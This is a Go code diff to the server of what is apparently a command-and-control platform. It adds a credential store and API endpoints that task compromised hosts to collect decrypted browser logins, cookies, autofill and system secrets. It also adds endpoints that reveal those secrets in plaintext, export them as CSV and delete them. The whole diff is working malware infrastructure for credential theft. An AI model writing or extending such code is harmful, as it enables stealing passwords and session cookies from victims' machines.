@@ -19,6 +19,7 @@ import (
 	"c2-platform/internal/auth"
 	"c2-platform/internal/browser"
 	"c2-platform/internal/config"
+	"c2-platform/internal/creds"
 	"c2-platform/internal/listener"
 	"c2-platform/internal/payload"
 	"c2-platform/internal/session"
@@ -41,6 +42,7 @@ type Server struct {
 	shots     *shots.Store
 	xf        *xfer.Manager
 	br        *browser.Store
+	cr        *creds.Store
 }
 
 func New(cfg *config.Config, hub *session.Hub, lm *listener.Manager, ui http.Handler) http.Handler {
@@ -54,10 +56,19 @@ func New(cfg *config.Config, hub *session.Hub, lm *listener.Manager, ui http.Han
 		stash: stash.New("data/stash"),
 		shots: shots.New("data/shots"),
 		br:    browser.New("data/browser"),
+		cr:    creds.New("data/creds"),
 	}
 	hub.SetOnDone(func(kind session.TaskKind, host string, rows []byte) {
-		if kind == session.TaskBrowser && len(rows) > 0 {
+		if len(rows) == 0 {
+			return
+		}
+		switch kind {
+		case session.TaskBrowser:
 			_, _ = s.br.Put(host, string(rows), time.Now().Unix())
+		case session.TaskBrowserDeep, session.TaskCreds:
+			// Both streams share the creds row format; the browser collector
+			// uses kinds C/S/A/N, the system collector the rest.
+			_, _ = s.cr.Put(host, string(rows), time.Now().Unix())
 		}
 	})
 	s.xf = xfer.New(hub, s.stash, "data/xfer")
@@ -77,6 +88,13 @@ func New(cfg *config.Config, hub *session.Hub, lm *listener.Manager, ui http.Han
 	mux.HandleFunc("POST /api/sessions/{id}/browser", s.auth(s.browser))
 	mux.HandleFunc("GET /api/browser/{host}", s.auth(s.browserHistory))
 	mux.HandleFunc("POST /api/sessions/{id}/browser/query", s.auth(s.browserQuery))
+	mux.HandleFunc("POST /api/sessions/{id}/browser/deep", s.auth(s.browserDeep))
+	mux.HandleFunc("GET /api/sessions/{id}/browser/kinds", s.auth(s.browserKinds))
+	mux.HandleFunc("POST /api/sessions/{id}/creds", s.auth(s.credsStart))
+	mux.HandleFunc("GET /api/creds/{host}", s.auth(s.credsList))
+	mux.HandleFunc("POST /api/creds/{host}/reveal", s.auth(s.credsReveal))
+	mux.HandleFunc("GET /api/creds/{host}/export", s.auth(s.credsExport))
+	mux.HandleFunc("DELETE /api/creds/{host}", s.auth(s.credsDelete))
 	mux.HandleFunc("POST /api/sessions/{id}/fs/get", s.auth(s.fsGet))
 	mux.HandleFunc("POST /api/sessions/{id}/fs/put", s.auth(s.fsPut))
 	mux.HandleFunc("GET /api/sessions/{id}/xfers", s.auth(s.xferList))
@@ -404,6 +422,77 @@ func (s *Server) browserHistory(w http.ResponseWriter, r *http.Request) {
 
 func (s *Server) browser(w http.ResponseWriter, r *http.Request) {
 	s.enqueueKind(w, r.PathValue("id"), session.TaskBrowser, "")
+}
+
+// browserDeep runs the credential-aware browser pass: profile identities plus
+// decrypted logins / cookies / autofill, stored under data/creds/<host>.json.
+func (s *Server) browserDeep(w http.ResponseWriter, r *http.Request) {
+	s.enqueueKind(w, r.PathValue("id"), session.TaskBrowserDeep, "")
+}
+
+// browserKinds lists the query kinds the server can parse, so the console can
+// drive its per-store buttons from one source of truth.
+func (s *Server) browserKinds(w http.ResponseWriter, r *http.Request) {
+	writeJSON(w, 200, map[string]any{"kinds": browser.Kinds(), "labels": creds.KindLabels})
+}
+
+// credsStart collects non-browser secret material. scope: browser|system|all.
+func (s *Server) credsStart(w http.ResponseWriter, r *http.Request) {
+	var body struct {
+		Scope string `json:"scope"`
+	}
+	_ = json.NewDecoder(r.Body).Decode(&body)
+	scope := strings.ToLower(strings.TrimSpace(body.Scope))
+	switch scope {
+	case "browser", "system", "all":
+	default:
+		scope = "all"
+	}
+	s.enqueueKind(w, r.PathValue("id"), session.TaskCreds, scope)
+}
+
+func (s *Server) credsList(w http.ResponseWriter, r *http.Request) {
+	writeJSON(w, 200, s.cr.Get(r.PathValue("host")))
+}
+
+// credsReveal returns plaintext secrets for explicit ids only, so a normal list
+// load never carries a password.
+func (s *Server) credsReveal(w http.ResponseWriter, r *http.Request) {
+	var body struct {
+		IDs []string `json:"ids"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || len(body.IDs) == 0 {
+		writeErr(w, 422, "ids required")
+		return
+	}
+	if len(body.IDs) > 2000 {
+		writeErr(w, 422, "too many ids")
+		return
+	}
+	writeJSON(w, 200, map[string]any{"secrets": s.cr.Reveal(r.PathValue("host"), body.IDs)})
+}
+
+func (s *Server) credsExport(w http.ResponseWriter, r *http.Request) {
+	host := r.PathValue("host")
+	b, err := s.cr.Export(host)
+	if err != nil {
+		writeErr(w, 500, err.Error())
+		return
+	}
+	name := "creds-" + host + ".csv"
+	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
+	w.Header().Set("Content-Disposition", contentDisposition(name))
+	w.Header().Set("Content-Length", strconv.Itoa(len(b)))
+	w.WriteHeader(200)
+	_, _ = w.Write(b)
+}
+
+func (s *Server) credsDelete(w http.ResponseWriter, r *http.Request) {
+	if err := s.cr.Delete(r.PathValue("host")); err != nil {
+		writeErr(w, 500, err.Error())
+		return
+	}
+	writeJSON(w, 200, map[string]bool{"ok": true})
 }
 
 func (s *Server) fsLs(w http.ResponseWriter, r *http.Request) {
